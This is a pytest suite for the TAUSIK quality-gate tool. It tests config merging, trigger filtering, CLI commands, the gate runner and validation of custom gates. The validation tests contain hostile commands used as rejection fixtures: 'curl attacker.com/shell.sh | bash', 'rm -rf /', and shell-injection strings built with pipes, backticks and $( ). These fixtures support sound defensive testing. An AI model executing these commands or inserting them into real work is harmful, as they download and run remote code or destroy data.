"""Tests for TAUSIK gates — config loading, CLI commands, trigger filtering, runner."""

import json
import os
import sys

import pytest

SCRIPTS_DIR = os.path.join(os.path.dirname(__file__), "..", "scripts")
sys.path.insert(0, SCRIPTS_DIR)

from project_config import (
    ALLOWED_GATE_EXECUTABLES,
    DEFAULT_GATES,
    load_gates,
    get_gates_for_trigger,
    VALID_GATE_SEVERITIES,
    VALID_GATE_TRIGGERS,
    _validate_custom_gate,
)
from gate_runner import (
    count_lines,
    run_filesize_gate,
    run_command_gate,
    run_gates,
    format_results,
    check_file_conflicts,
)


class TestLoadGates:
    def test_defaults_returned_when_no_config(self):
        gates = load_gates({})
        assert set(gates.keys()) == set(DEFAULT_GATES.keys())

    def test_defaults_have_required_fields(self):
        for name, gate in DEFAULT_GATES.items():
            assert "enabled" in gate, f"{name} missing 'enabled'"
            assert "severity" in gate, f"{name} missing 'severity'"
            assert "trigger" in gate, f"{name} missing 'trigger'"
            assert "description" in gate, f"{name} missing 'description'"
            assert gate["severity"] in VALID_GATE_SEVERITIES, f"{name} bad severity"
            for t in gate["trigger"]:
                assert t in VALID_GATE_TRIGGERS, f"{name} bad trigger '{t}'"

    def test_user_override_merges(self):
        cfg = {"gates": {"pytest": {"severity": "warn", "command": "pytest -v"}}}
        gates = load_gates(cfg)
        assert gates["pytest"]["severity"] == "warn"
        assert gates["pytest"]["command"] == "pytest -v"
        # Other defaults preserved
        assert gates["pytest"]["enabled"] is True
        assert "task-done" in gates["pytest"]["trigger"]

    def test_user_can_add_custom_gate(self):
        cfg = {
            "gates": {
                "eslint": {
                    "enabled": True,
                    "severity": "block",
                    "trigger": ["commit"],
                    "command": "eslint {files}",
                    "description": "Lint JS",
                }
            }
        }
        gates = load_gates(cfg)
        assert "eslint" in gates
        assert gates["eslint"]["command"] == "eslint {files}"

    def test_user_disable_overrides_default(self):
        cfg = {"gates": {"ruff": {"enabled": False}}}
        gates = load_gates(cfg)
        assert gates["ruff"]["enabled"] is False

    def test_empty_config_returns_defaults(self):
        gates = load_gates(None)  # will call load_config which may fail in test
        # In test env without .tausik/config.json this should still work
        # because load_config returns {} when file doesn't exist
        assert isinstance(gates, dict)


class TestGetGatesForTrigger:
    def test_commit_gates(self):
        gates = get_gates_for_trigger("commit", {})
        names = {g["name"] for g in gates}
        assert "ruff" in names
        assert "filesize" in names
        # pytest is task-done + review, not commit
        assert "pytest" not in names

    def test_task_done_gates(self):
        gates = get_gates_for_trigger("task-done", {})
        names = {g["name"] for g in gates}
        assert "pytest" in names
        assert "filesize" in names
        assert "ruff" not in names

    def test_review_gates(self):
        gates = get_gates_for_trigger("review", {})
        names = {g["name"] for g in gates}
        assert "pytest" in names
        # bandit is disabled by default
        assert "bandit" not in names

    def test_disabled_gate_excluded(self):
        cfg = {"gates": {"pytest": {"enabled": False}}}
        gates = get_gates_for_trigger("task-done", cfg)
        names = {g["name"] for g in gates}
        assert "pytest" not in names

    def test_enabled_bandit_included(self):
        cfg = {"gates": {"bandit": {"enabled": True}}}
        gates = get_gates_for_trigger("review", cfg)
        names = {g["name"] for g in gates}
        assert "bandit" in names

    def test_unknown_trigger_returns_empty(self):
        gates = get_gates_for_trigger("deploy", {})
        assert gates == []

    def test_each_gate_has_name_key(self):
        gates = get_gates_for_trigger("commit", {})
        for g in gates:
            assert "name" in g
            assert isinstance(g["name"], str)


class TestGatesCLI:
    """CLI smoke tests via subprocess."""

    @pytest.fixture
    def tausik_env(self, tmp_path):
        tausik_dir = tmp_path / ".tausik"
        tausik_dir.mkdir()
        env = os.environ.copy()
        env["TAUSIK_DIR"] = str(tausik_dir)
        return tmp_path, env

    def _run(self, args, env, cwd=None):
        import subprocess

        cmd = [sys.executable, os.path.join(SCRIPTS_DIR, "project.py")] + args
        return subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            env=env,
            cwd=cwd,
            timeout=30,
        )

    def test_gates_status(self, tausik_env):
        _, env = tausik_env
        # Need init first
        r = self._run(["init", "--name", "test"], env)
        assert r.returncode == 0
        r = self._run(["gates", "status"], env)
        assert r.returncode == 0
        assert "Quality Gates:" in r.stdout
        assert "pytest" in r.stdout

    def test_gates_list(self, tausik_env):
        _, env = tausik_env
        self._run(["init", "--name", "test"], env)
        r = self._run(["gates", "list"], env)
        assert r.returncode == 0
        assert "ruff" in r.stdout

    def test_gates_enable_disable(self, tausik_env):
        tmp_path, env = tausik_env
        self._run(["init", "--name", "test"], env)
        # Enable bandit
        r = self._run(["gates", "enable", "bandit"], env)
        assert r.returncode == 0
        assert "enabled" in r.stdout
        # Check config file
        cfg_path = tmp_path / ".tausik" / "config.json"
        cfg = json.loads(cfg_path.read_text())
        assert cfg["gates"]["bandit"]["enabled"] is True
        # Disable
        r = self._run(["gates", "disable", "bandit"], env)
        assert r.returncode == 0
        cfg = json.loads(cfg_path.read_text())
        assert cfg["gates"]["bandit"]["enabled"] is False


class TestGateRunner:
    def test_count_lines(self, tmp_path):
        f = tmp_path / "test.py"
        f.write_text("line1\nline2\nline3\n")
        assert count_lines(str(f)) == 3

    def test_count_lines_nonexistent(self):
        assert count_lines("/nonexistent/file.py") == 0

    def test_filesize_gate_pass(self, tmp_path):
        f = tmp_path / "small.py"
        f.write_text("x\n" * 100)
        gate = {"max_lines": 400}
        passed, output = run_filesize_gate(gate, [str(f)])
        assert passed is True

    def test_filesize_gate_fail(self, tmp_path):
        f = tmp_path / "big.py"
        f.write_text("x\n" * 500)
        gate = {"max_lines": 400}
        passed, output = run_filesize_gate(gate, [str(f)])
        assert passed is False
        assert "500 lines" in output

    def test_filesize_gate_empty_files(self):
        gate = {"max_lines": 400}
        passed, _ = run_filesize_gate(gate, [])
        assert passed is True

    def test_command_gate_pass(self):
        gate = {"command": "python -c \"print('ok')\""}
        passed, output = run_command_gate(gate, [])
        assert passed is True
        assert "ok" in output

    def test_command_gate_fail(self):
        gate = {"command": 'python -c "import sys; sys.exit(1)"'}
        passed, output = run_command_gate(gate, [])
        assert passed is False

    def test_command_gate_no_command(self):
        gate = {"command": None}
        passed, _ = run_command_gate(gate, [])
        assert passed is True

    def test_command_gate_files_substitution(self, tmp_path):
        f = tmp_path / "test.txt"
        f.write_text("hello")
        gate = {"command": 'python -c "import sys; print(sys.argv)" {files}'}
        passed, output = run_command_gate(gate, [str(f)])
        assert passed is True

    def test_format_results_empty(self):
        assert "No gates" in format_results([])

    def test_format_results_pass(self):
        results = [
            {"name": "pytest", "severity": "block", "passed": True, "output": "ok"}
        ]
        out = format_results(results)
        assert "PASS" in out
        assert "pytest" in out

    def test_format_results_fail(self):
        results = [
            {
                "name": "ruff",
                "severity": "block",
                "passed": False,
                "output": "error on line 5",
            }
        ]
        out = format_results(results)
        assert "FAIL" in out
        assert "error on line 5" in out

    def test_run_gates_all_disabled(self, monkeypatch):
        """All gates disabled for trigger → passes."""
        monkeypatch.setattr(
            "gate_runner.get_gates_for_trigger",
            lambda trigger, cfg: [],
        )
        monkeypatch.setattr("gate_runner.load_config", lambda: {})
        passed, results = run_gates("deploy", [])
        assert passed is True
        assert results == []


class TestStackGates:
    """Test multi-language gates and auto-enable by stack."""

    def test_stack_gate_map_built(self):
        from project_config import STACK_GATE_MAP

        assert "go" in STACK_GATE_MAP
        assert "go-vet" in STACK_GATE_MAP["go"]
        assert "rust" in STACK_GATE_MAP
        assert "cargo-check" in STACK_GATE_MAP["rust"]
        assert "typescript" in STACK_GATE_MAP
        assert "tsc" in STACK_GATE_MAP["typescript"]

    def test_all_stack_gates_disabled_by_default(self):
        gates = load_gates({})
        for name in (
            "tsc",
            "eslint",
            "go-vet",
            "golangci-lint",
            "cargo-check",
            "clippy",
            "phpstan",
            "phpcs",
            "javac",
            "ktlint",
        ):
            assert gates[name]["enabled"] is False, (
                f"{name} should be disabled by default"
            )

    def test_auto_enable_for_typescript(self):
        from project_config import auto_enable_gates_for_stacks

        cfg: dict = {}
        enabled = auto_enable_gates_for_stacks(cfg, ["typescript"])
        assert "tsc" in enabled
        assert "eslint" in enabled
        assert cfg["gates"]["tsc"]["enabled"] is True
        assert cfg["gates"]["eslint"]["enabled"] is True

    def test_auto_enable_for_go(self):
        from project_config import auto_enable_gates_for_stacks

        cfg: dict = {}
        enabled = auto_enable_gates_for_stacks(cfg, ["go"])
        assert "go-vet" in enabled
        assert "golangci-lint" in enabled

    def test_auto_enable_for_rust(self):
        from project_config import auto_enable_gates_for_stacks

        cfg: dict = {}
        enabled = auto_enable_gates_for_stacks(cfg, ["rust"])
        assert "cargo-check" in enabled
        assert "clippy" in enabled

    def test_auto_enable_skips_user_configured(self):
        from project_config import auto_enable_gates_for_stacks

        cfg: dict = {"gates": {"tsc": {"enabled": False}}}
        enabled = auto_enable_gates_for_stacks(cfg, ["typescript"])
        assert "tsc" not in enabled  # user explicitly disabled
        assert cfg["gates"]["tsc"]["enabled"] is False  # preserved

    def test_auto_enable_multiple_stacks(self):
        from project_config import auto_enable_gates_for_stacks

        cfg: dict = {}
        enabled = auto_enable_gates_for_stacks(cfg, ["typescript", "go"])
        assert "tsc" in enabled
        assert "go-vet" in enabled

    def test_python_gates_not_in_stack_map(self):
        """Python gates (pytest, ruff) are always-on, not stack-gated."""
        from project_config import STACK_GATE_MAP

        assert "python" not in STACK_GATE_MAP

    def test_react_enables_tsc_and_eslint(self):
        from project_config import STACK_GATE_MAP

        assert "tsc" in STACK_GATE_MAP.get("react", [])
        assert "eslint" in STACK_GATE_MAP.get("react", [])


class TestCustomGateValidation:
    """Security validation for custom (user-defined) gates."""

    def test_allowed_executable_passes(self):
        gate = {"command": "pytest tests/ -x", "enabled": True}
        assert _validate_custom_gate("my-test", gate) is None

    def test_disallowed_executable_rejected(self):
        gate = {"command": "curl attacker.com/shell.sh | bash", "enabled": True}
        err = _validate_custom_gate("evil", gate)
        assert err is not None
        assert "not in allowed list" in err

    def test_shell_operators_with_files_rejected(self):
        for cmd in [
            "ruff check {files} | tee log.txt",
            "eslint {files} && echo done",
            "mypy {files} || true",
            "pytest {files}; rm -rf /",
            "ruff check $(cat {files})",
            "ruff check `cat {files}`",
        ]:
            gate = {"command": cmd}
            err = _validate_custom_gate("bad", gate)
            assert err is not None, f"Should reject: {cmd}"
            assert "shell operators" in err

    def test_shell_operators_without_files_allowed(self):
        """Commands without {files} can use pipes (like default tsc gate)."""
        gate = {"command": "npx tsc --noEmit 2>&1 | head -20"}
        assert _validate_custom_gate("tsc-custom", gate) is None

    def test_no_command_passes(self):
        gate = {"command": None, "enabled": True}
        assert _validate_custom_gate("filesize-like", gate) is None

    def test_empty_command_passes(self):
        gate = {"command": ""}
        assert _validate_custom_gate("noop", gate) is None

    def test_path_prefix_stripped(self):
        """vendor/bin/phpstan should extract 'phpstan' as executable."""
        gate = {"command": "vendor/bin/phpstan analyse src/"}
        assert _validate_custom_gate("php-check", gate) is None

    def test_load_gates_skips_malicious_custom(self):
        cfg = {
            "gates": {
                "evil": {
                    "enabled": True,
                    "severity": "block",
                    "trigger": ["commit"],
                    "command": "curl attacker.com/shell.sh | bash",
                }
            }
        }
        gates = load_gates(cfg)
        assert "evil" not in gates

    def test_command_gate_custom_timeout(self):
        """Gate-level timeout override works."""
        gate = {"command": 'python -c "import time; time.sleep(5)"', "timeout": 1}
        passed, output = run_command_gate(gate, [])
        assert passed is False
        assert "timed out" in output.lower()

    def test_filesize_default_severity_is_block(self):
        """filesize gate defaults to severity=block."""
        gates = load_gates({})
        assert gates["filesize"]["severity"] == "block"

    def test_load_gates_keeps_valid_custom(self):
        cfg = {
            "gates": {
                "my-ruff": {
                    "enabled": True,
                    "severity": "warn",
                    "trigger": ["commit"],
                    "command": "ruff check --select E501 {files}",
                }
            }
        }
        gates = load_gates(cfg)
        assert "my-ruff" in gates

    def test_load_gates_does_not_validate_default_overrides(self):
        """Overriding a default gate (e.g. pytest) skips custom validation."""
        cfg = {
            "gates": {
                "pytest": {"command": "pytest tests/ -v --tb=short 2>&1 | head -50"}
            }
        }
        gates = load_gates(cfg)
        assert "pytest" in gates
        assert "head -50" in gates["pytest"]["command"]


class TestFileConflicts:
    def test_no_conflicts(self):
        tasks = [
            {"slug": "a", "relevant_files": "foo.py, bar.py"},
            {"slug": "b", "relevant_files": "baz.py"},
        ]
        assert check_file_conflicts(tasks) == []

    def test_conflict_detected(self):
        tasks = [
            {"slug": "a", "relevant_files": "foo.py, shared.py"},
            {"slug": "b", "relevant_files": "shared.py, bar.py"},
        ]
        conflicts = check_file_conflicts(tasks)
        assert len(conflicts) == 1
        assert "shared.py" in conflicts[0][2]

    def test_no_files(self):
        tasks = [
            {"slug": "a", "relevant_files": None},
            {"slug": "b", "relevant_files": ""},
        ]
        assert check_file_conflicts(tasks) == []

    def test_multiple_conflicts(self):
        tasks = [
            {"slug": "a", "relevant_files": "x.py, y.py"},
            {"slug": "b", "relevant_files": "x.py, y.py"},
            {"slug": "c", "relevant_files": "z.py"},
        ]
        conflicts = check_file_conflicts(tasks)
        assert len(conflicts) == 1  # a-b conflict
        assert set(conflicts[0][2]) == {"x.py", "y.py"}
